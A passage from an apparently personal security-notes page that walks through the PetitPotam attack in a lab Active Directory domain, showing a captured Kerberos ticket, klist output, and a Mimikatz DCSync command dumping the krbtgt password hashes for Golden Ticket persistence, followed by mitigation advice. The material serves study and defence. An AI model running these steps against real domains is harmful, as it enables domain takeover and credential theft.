<a id=__codelineno-23-17 name=__codelineno-23-17 href=#__codelineno-23-17></a>[+] TGT request successful!
<a id=__codelineno-23-18 name=__codelineno-23-18 href=#__codelineno-23-18></a>[*] base64(ticket.kirbi):
<a id=__codelineno-23-19 name=__codelineno-23-19 href=#__codelineno-23-19></a> doIGUDCCBkygAwIBBaEDAgEWooIFSDCCBURhggVAMIIFPKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
<a id=__codelineno-23-20 name=__codelineno-23-20 href=#__codelineno-23-20></a>      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggTyMIIE7qADAgEXoQMC
<a id=__codelineno-23-21 name=__codelineno-23-21 href=#__codelineno-23-21></a>      AQKiggTgBIIE3IHVcI8Q7gEgvqZmbo2BFOclIQogbXr++rtdBdgL5MPlU2V15kXxx4vZaBRzBv6/e3MC
<a id=__codelineno-23-22 name=__codelineno-23-22 href=#__codelineno-23-22></a>      exXtfUDZce8olUa1oy901BOhQNRuW0d9efigvnpL1fz0QwgLC0gcGtfPtQxJLTpLYWcDyViNdncjj76P
<a id=__codelineno-23-23 name=__codelineno-23-23 href=#__codelineno-23-23></a>      IZJzOTbSXT1bNVFpM9YwXa/tYPbAFRAhr0aP49FkEUeRVoz2HDMre8gfN5y2abc5039Yf9zjvo78I/HH
<a id=__codelineno-23-24 name=__codelineno-23-24 href=#__codelineno-23-24></a>      NmLWni29T9TDyfmU/xh/qkldGiaBrqOiUqC19X7unyEbafC6vr9er+j77TlMV88S3fUD/f1hPYMTCame
<a id=__codelineno-23-25 name=__codelineno-23-25 href=#__codelineno-23-25></a>      svFXFNt5VMbRo3/wQ8+fbPNDsTF+NZRLTAGZOsEyTfNEfpw1nhOVnLKrPYyNwXpddOpoD58+DCU90FAZ
<a id=__codelineno-23-26 name=__codelineno-23-26 href=#__codelineno-23-26></a>      g69yH2enKv+dNT84oQUxE+9gOFwKujYxDSB7g/2PUsfUh7hKhv3OkjEFOrzW3Xrh98yHrg6AtrENxL89
<a id=__codelineno-23-27 name=__codelineno-23-27 href=#__codelineno-23-27></a>      CxOdSfj0HNrhVFgMpMepPxT5Sy2mX8WDsE1CWjckcqFUS6HCFwAxzTqILbO1mbNO9gWKhMPwyJDlENJq
<a id=__codelineno-23-28 name=__codelineno-23-28 href=#__codelineno-23-28></a>      WdmLFmThiih7lClG05xNt56q2EY3y/m8Tpq8nyPey580TinHrkvCuE2hLeoiWdgBQiMPBUe23NRNxPHE
<a id=__codelineno-23-29 name=__codelineno-23-29 href=#__codelineno-23-29></a>      PjrmxMU/HKr/BPnMobdfRafgYPCRObJVQynOJrummdx5scUWTevrCFZd+q3EQcnEyRXcvQJFDU3VVOHb
<a id=__codelineno-23-30 name=__codelineno-23-30 href=#__codelineno-23-30></a>      Cfp+IYd5AXGyIxSmena/+uynzuqARUeRl1x/q8jhRh7ibIWnJV8YzV84zlSc4mdX4uVNNidLkxwCu2Y4
<a id=__codelineno-23-31 name=__codelineno-23-31 href=#__codelineno-23-31></a>      K37BE6AWycYH7DjZEzCE4RSeRu5fy37M0u6Qvx7Y7S04huqy1Hbg0RFbIw48TRN6qJrKRUSKep1j19n6
<a id=__codelineno-23-32 name=__codelineno-23-32 href=#__codelineno-23-32></a>      h3hw9z4LN3iGXC4Xr6AZzjHzY5GQFaviZQ34FEg4xF/Dkq4R3abDj+RWgFkgIl0B5y4oQxVRPHoQ+60n
<a id=__codelineno-23-33 name=__codelineno-23-33 href=#__codelineno-23-33></a>      CXFC5KznsKgSBV8Tm35l6RoFN5Qa6VLvb+P5WPBuo7F0kqUzbPdzTLPCfx8MXt46Jbg305QcISC/QOFP
<a id=__codelineno-23-34 name=__codelineno-23-34 href=#__codelineno-23-34></a>      T//e7l7AJbQ+GjQBaqY8qQXFD1Gl4tmiUkVMjIQrsYQzuL6D3Ffko/OOgtGuYZu8yO9wVwTQWAgbqEbw
<a id=__codelineno-23-35 name=__codelineno-23-35 href=#__codelineno-23-35></a>      T2xd+SRCmElUHUQV0eId1lALJfE1DC/5w0++2srQTtLA4LHxb3L5dalF/fCDXjccoPj0+Q+vJmty0XGe
<a id=__codelineno-23-36 name=__codelineno-23-36 href=#__codelineno-23-36></a>      +Dz6GyGsW8eiE7RRmLi+IPzL2UnOa4CO5xMAcGQWeoHT0hYmLdRcK9udkO6jmWi4OMmvKzO0QY6xuflN
<a id=__codelineno-23-37 name=__codelineno-23-37 href=#__codelineno-23-37></a>      hLftjIYfDxWzqFoM4d3E1x/Jz4aTFKf4fbE3PFyMWQq98lBt3hZPbiDb1qchvYLNHyRxH3VHUQOaCIgL
<a id=__codelineno-23-38 name=__codelineno-23-38 href=#__codelineno-23-38></a>      /vpppveSHvzkfq/3ft1gca6rCYx9Lzm8LjVosLXXbhXKttsKslmWZWf6kJ3Ym14nJYuq7OClcQzZKkb3
<a id=__codelineno-23-39 name=__codelineno-23-39 href=#__codelineno-23-39></a>      EPovED0+mPyyhtE8SL0rnCxy1XEttnusQfasac4Xxt5XrERMQLvEDfy0mrOQDICTFH9gpFrzU7d2v87U
<a id=__codelineno-23-40 name=__codelineno-23-40 href=#__codelineno-23-40></a>      HDnpr2gGLfZSDnh149ZVXxqe9sYMUqSbns6+UOv6EW3JPNwIsm7PLSyCDyeRgJxZYUl4XrdpPHcaX71k
<a id=__codelineno-23-41 name=__codelineno-23-41 href=#__codelineno-23-41></a>      ybUAsMd3PhvSy9HAnJ/tAew3+t/CsvzddqHwgYBohK+eg0LhMZtbOWv7aWvsxEgplCgFXS18o4HzMIHw
<a id=__codelineno-23-42 name=__codelineno-23-42 href=#__codelineno-23-42></a>      oAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagGzAZoAMCARehEgQQd/AohN1w1ZZXsks8cCUlbqEVGxNJ
<a id=__codelineno-23-43 name=__codelineno-23-43 href=#__codelineno-23-43></a>      TkxBTkVGUkVJR0hULkxPQ0FMoh0wG6ADAgEBoRQwEhsQQUNBREVNWS1FQS1EQzAxJKMHAwUAQOEAAKUR
<a id=__codelineno-23-44 name=__codelineno-23-44 href=#__codelineno-23-44></a>      GA8yMDIyMDMzMDIyNTAyNVqmERgPMjAyMjAzMzEwODUwMjVapxEYDzIwMjIwNDA2MjI1MDI1WqgVGxNJ
<a id=__codelineno-23-45 name=__codelineno-23-45 href=#__codelineno-23-45></a>      TkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM
<a id=__codelineno-23-46 name=__codelineno-23-46 href=#__codelineno-23-46></a>[+] Ticket successfully imported!
<a id=__codelineno-23-47 name=__codelineno-23-47 href=#__codelineno-23-47></a>
<a id=__codelineno-23-48 name=__codelineno-23-48 href=#__codelineno-23-48></a>  ServiceName              :  krbtgt/legalcorp.local
<a id=__codelineno-23-49 name=__codelineno-23-49 href=#__codelineno-23-49></a>  ServiceRealm             :  legalcorp.local
<a id=__codelineno-23-50 name=__codelineno-23-50 href=#__codelineno-23-50></a>  UserName                 :  ACADEMY-EA-DC01$
<a id=__codelineno-23-51 name=__codelineno-23-51 href=#__codelineno-23-51></a>  UserRealm                :  legalcorp.local
<a id=__codelineno-23-52 name=__codelineno-23-52 href=#__codelineno-23-52></a>  StartTime                :  3/30/2022 3:50:25 PM
<a id=__codelineno-23-53 name=__codelineno-23-53 href=#__codelineno-23-53></a>  EndTime                  :  3/31/2022 1:50:25 AM
<a id=__codelineno-23-54 name=__codelineno-23-54 href=#__codelineno-23-54></a>  RenewTill                :  4/6/2022 3:50:25 PM
<a id=__codelineno-23-55 name=__codelineno-23-55 href=#__codelineno-23-55></a>  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
<a id=__codelineno-23-56 name=__codelineno-23-56 href=#__codelineno-23-56></a>  KeyType                  :  rc4_hmac
<a id=__codelineno-23-57 name=__codelineno-23-57 href=#__codelineno-23-57></a>  Base64(key)              :  d/AohN1w1ZZXsks8cCUlbg==
<a id=__codelineno-23-58 name=__codelineno-23-58 href=#__codelineno-23-58></a>  ASREP (key)              :  2A621F62C32241F38FA68826E95521DD
</code></pre></div></p> <p>Confirming the Ticket is in Memory <div class=highlight><pre><span></span><code><a id=__codelineno-24-1 name=__codelineno-24-1 href=#__codelineno-24-1></a>PS C:\Tools&gt; klist
<a id=__codelineno-24-2 name=__codelineno-24-2 href=#__codelineno-24-2></a>
<a id=__codelineno-24-3 name=__codelineno-24-3 href=#__codelineno-24-3></a>Current LogonId is 0:0x4e56b
<a id=__codelineno-24-4 name=__codelineno-24-4 href=#__codelineno-24-4></a>
<a id=__codelineno-24-5 name=__codelineno-24-5 href=#__codelineno-24-5></a>Cached Tickets: (3)
<a id=__codelineno-24-6 name=__codelineno-24-6 href=#__codelineno-24-6></a>
<a id=__codelineno-24-7 name=__codelineno-24-7 href=#__codelineno-24-7></a>#0&gt;     Client: ACADEMY-EA-DC01$ @ legalcorp.local
<a id=__codelineno-24-8 name=__codelineno-24-8 href=#__codelineno-24-8></a>        Server: krbtgt/legalcorp.local @ legalcorp.local
<a id=__codelineno-24-9 name=__codelineno-24-9 href=#__codelineno-24-9></a>        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
<a id=__codelineno-24-10 name=__codelineno-24-10 href=#__codelineno-24-10></a>        Ticket Flags 0x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canonicalize
<a id=__codelineno-24-11 name=__codelineno-24-11 href=#__codelineno-24-11></a>        Start Time: 3/30/2022 15:53:09 (local)
<a id=__codelineno-24-12 name=__codelineno-24-12 href=#__codelineno-24-12></a>        End Time:   3/31/2022 1:50:25 (local)
<a id=__codelineno-24-13 name=__codelineno-24-13 href=#__codelineno-24-13></a>        Renew Time: 4/6/2022 15:50:25 (local)
<a id=__codelineno-24-14 name=__codelineno-24-14 href=#__codelineno-24-14></a>        Session Key Type: RSADSI RC4-HMAC(NT)
<a id=__codelineno-24-15 name=__codelineno-24-15 href=#__codelineno-24-15></a>        Cache Flags: 0x2 -&gt; DELEGATION
<a id=__codelineno-24-16 name=__codelineno-24-16 href=#__codelineno-24-16></a>        Kdc Called: ACADEMY-EA-DC01.legalcorp.local
<a id=__codelineno-24-17 name=__codelineno-24-17 href=#__codelineno-24-17></a>
<a id=__codelineno-24-18 name=__codelineno-24-18 href=#__codelineno-24-18></a>#1&gt;     Client: ACADEMY-EA-DC01$ @ legalcorp.local
<a id=__codelineno-24-19 name=__codelineno-24-19 href=#__codelineno-24-19></a>        Server: krbtgt/legalcorp.local @ legalcorp.local
<a id=__codelineno-24-20 name=__codelineno-24-20 href=#__codelineno-24-20></a>        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
<a id=__codelineno-24-21 name=__codelineno-24-21 href=#__codelineno-24-21></a>        Ticket Flags 0x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize
<a id=__codelineno-24-22 name=__codelineno-24-22 href=#__codelineno-24-22></a>        Start Time: 3/30/2022 15:50:25 (local)
<a id=__codelineno-24-23 name=__codelineno-24-23 href=#__codelineno-24-23></a>        End Time:   3/31/2022 1:50:25 (local)
<a id=__codelineno-24-24 name=__codelineno-24-24 href=#__codelineno-24-24></a>        Renew Time: 4/6/2022 15:50:25 (local)
<a id=__codelineno-24-25 name=__codelineno-24-25 href=#__codelineno-24-25></a>        Session Key Type: RSADSI RC4-HMAC(NT)
<a id=__codelineno-24-26 name=__codelineno-24-26 href=#__codelineno-24-26></a>        Cache Flags: 0x1 -&gt; PRIMARY
<a id=__codelineno-24-27 name=__codelineno-24-27 href=#__codelineno-24-27></a>        Kdc Called:
<a id=__codelineno-24-28 name=__codelineno-24-28 href=#__codelineno-24-28></a>
<a id=__codelineno-24-29 name=__codelineno-24-29 href=#__codelineno-24-29></a>#2&gt;     Client: ACADEMY-EA-DC01$ @ legalcorp.local
<a id=__codelineno-24-30 name=__codelineno-24-30 href=#__codelineno-24-30></a>        Server: cifs/academy-ea-dc01 @ legalcorp.local
<a id=__codelineno-24-31 name=__codelineno-24-31 href=#__codelineno-24-31></a>        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
<a id=__codelineno-24-32 name=__codelineno-24-32 href=#__codelineno-24-32></a>        Ticket Flags 0x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_canonicalize
<a id=__codelineno-24-33 name=__codelineno-24-33 href=#__codelineno-24-33></a>        Start Time: 3/30/2022 15:53:09 (local)
<a id=__codelineno-24-34 name=__codelineno-24-34 href=#__codelineno-24-34></a>        End Time:   3/31/2022 1:50:25 (local)
<a id=__codelineno-24-35 name=__codelineno-24-35 href=#__codelineno-24-35></a>        Renew Time: 4/6/2022 15:50:25 (local)
<a id=__codelineno-24-36 name=__codelineno-24-36 href=#__codelineno-24-36></a>        Session Key Type: RSADSI RC4-HMAC(NT)
<a id=__codelineno-24-37 name=__codelineno-24-37 href=#__codelineno-24-37></a>        Cache Flags: 0
<a id=__codelineno-24-38 name=__codelineno-24-38 href=#__codelineno-24-38></a>        Kdc Called: ACADEMY-EA-DC01.legalcorp.local
</code></pre></div></p> <p>Again, since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host. Here, we grab the NT hash for the KRBTGT account, which could be used to create a Golden Ticket and establish persistence. We could obtain the NT hash for any privileged user using DCSync.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-25-1 name=__codelineno-25-1 href=#__codelineno-25-1></a>PS C:\Tools&gt; cd .\mimikatz\x64\
<a id=__codelineno-25-2 name=__codelineno-25-2 href=#__codelineno-25-2></a>PS C:\Tools\mimikatz\x64&gt; .\mimikatz.exe
<a id=__codelineno-25-3 name=__codelineno-25-3 href=#__codelineno-25-3></a>
<a id=__codelineno-25-4 name=__codelineno-25-4 href=#__codelineno-25-4></a>  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
<a id=__codelineno-25-5 name=__codelineno-25-5 href=#__codelineno-25-5></a> .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
<a id=__codelineno-25-6 name=__codelineno-25-6 href=#__codelineno-25-6></a> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
<a id=__codelineno-25-7 name=__codelineno-25-7 href=#__codelineno-25-7></a> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
<a id=__codelineno-25-8 name=__codelineno-25-8 href=#__codelineno-25-8></a> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
<a id=__codelineno-25-9 name=__codelineno-25-9 href=#__codelineno-25-9></a>  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
<a id=__codelineno-25-10 name=__codelineno-25-10 href=#__codelineno-25-10></a>
<a id=__codelineno-25-11 name=__codelineno-25-11 href=#__codelineno-25-11></a>mimikatz # lsadump::dcsync /user:LEGALCORP\krbtgt
<a id=__codelineno-25-12 name=__codelineno-25-12 href=#__codelineno-25-12></a>[DC] &#39;legalcorp.local&#39; will be the domain
<a id=__codelineno-25-13 name=__codelineno-25-13 href=#__codelineno-25-13></a>[DC] &#39;ACADEMY-EA-DC01.legalcorp.local&#39; will be the DC server
<a id=__codelineno-25-14 name=__codelineno-25-14 href=#__codelineno-25-14></a>[DC] &#39;LEGALCORP\krbtgt&#39; will be the user account
<a id=__codelineno-25-15 name=__codelineno-25-15 href=#__codelineno-25-15></a>[rpc] Service  : ldap
<a id=__codelineno-25-16 name=__codelineno-25-16 href=#__codelineno-25-16></a>[rpc] AuthnSvc : GSS_NEGOTIATE (9)
<a id=__codelineno-25-17 name=__codelineno-25-17 href=#__codelineno-25-17></a>
<a id=__codelineno-25-18 name=__codelineno-25-18 href=#__codelineno-25-18></a>Object RDN           : krbtgt
<a id=__codelineno-25-19 name=__codelineno-25-19 href=#__codelineno-25-19></a>
<a id=__codelineno-25-20 name=__codelineno-25-20 href=#__codelineno-25-20></a>** SAM ACCOUNT **
<a id=__codelineno-25-21 name=__codelineno-25-21 href=#__codelineno-25-21></a>
<a id=__codelineno-25-22 name=__codelineno-25-22 href=#__codelineno-25-22></a>SAM Username         : krbtgt
<a id=__codelineno-25-23 name=__codelineno-25-23 href=#__codelineno-25-23></a>Account Type         : 30000000 ( USER_OBJECT )
<a id=__codelineno-25-24 name=__codelineno-25-24 href=#__codelineno-25-24></a>User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
<a id=__codelineno-25-25 name=__codelineno-25-25 href=#__codelineno-25-25></a>Account expiration   :
<a id=__codelineno-25-26 name=__codelineno-25-26 href=#__codelineno-25-26></a>Password last change : 10/27/2021 8:14:34 AM
<a id=__codelineno-25-27 name=__codelineno-25-27 href=#__codelineno-25-27></a>Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-502
<a id=__codelineno-25-28 name=__codelineno-25-28 href=#__codelineno-25-28></a>Object Relative ID   : 502
<a id=__codelineno-25-29 name=__codelineno-25-29 href=#__codelineno-25-29></a>
<a id=__codelineno-25-30 name=__codelineno-25-30 href=#__codelineno-25-30></a>Credentials:
<a id=__codelineno-25-31 name=__codelineno-25-31 href=#__codelineno-25-31></a>  Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc
<a id=__codelineno-25-32 name=__codelineno-25-32 href=#__codelineno-25-32></a>    ntlm- 0: 16e26ba33e455a8c338142af8d89ffbc
<a id=__codelineno-25-33 name=__codelineno-25-33 href=#__codelineno-25-33></a>    lm  - 0: 4562458c201a97fa19365ce901513c21
</code></pre></div> <hr> <h2>PetitPotam Mitigations</h2> <p>The patch for <a href=https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942 target=_blank rel="noopener nofollow">CVE-2021-36942</a> should be applied to any affected hosts. Further steps:</p> <ul> <li>To prevent NTLM relay attacks, use <a href=https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811 target=_blank rel="noopener nofollow">Extended Protection for Authentication</a> along with enabling <a href=https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429 target=_blank rel="noopener nofollow">Require SSL</a> to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services</li> <li> <a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain target=_blank rel="noopener nofollow">Disabling NTLM authentication</a> for Domain Controllers</li> <li>Disabling NTLM on AD CS servers using <a href=https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic target=_blank rel="noopener nofollow">Group Policy</a> </li> <li>Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use</li> </ul> <p>For more reading on attacking Active Directory Certificate Services, whitepaper <a href=https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf target=_blank rel="noopener nofollow">Certified Pre-Owned</a> as this demonstrates attacks against AD CS that can be performed using authenticated API calls. This shows that just applying the CVE-2021-36942 patch alone to mitigate PetitPotam is not enough for most organizations running AD CS, because an attacker with standard domain user credentials can still perform attacks against AD CS in many instances. The whitepaper also details other hardening and detection steps that can be taken to harden AD CS.</p> </article> </div> <script>var input,hash=location.hash.slice(1);hash.startsWith("__tabbed_")&&((input=document.getElementById(hash)).checked=!0)</script> </div> <a href=# class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg> Back to top </a> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../kerberos_double_hop/ class="md-footer__link md-footer__link--prev" aria-label="Previous: Kerberos Double Hop" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Previous </span> Kerberos Double Hop </div> </div> </a> <a href=../miscellaneous_misconfigurations/ class="md-footer__link md-footer__link--next" aria-label="Next: Misconfigurations" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Next </span> Misconfigurations </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2021 - 2022 neutronsec </div> </div> <div class=md-social> <a href=https://github.com/neutronsec target=_blank rel=noopener title=github.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </a> <a href=https://twitter.com/neutronctf target=_blank rel=noopener title=twitter.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg> </a> <a href=https://secops.cc target=_blank rel=noopener title=secops.cc class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg> </a> <a href=mailto:hello@neutronsec.com target=_blank rel=noopener title class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2m-3 13H7v-2h10m0-2H7v-2h10m3-2h-3V6h3"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../../..", "features": ["announce.dismiss", "content.code.annotate", "content.tooltips", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow", "toc.integrate"], "search": "../../../assets/javascripts/workers/search.720157f5.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src=../../../assets/javascripts/bundle.d36b1844.min.js></script> </body> </html>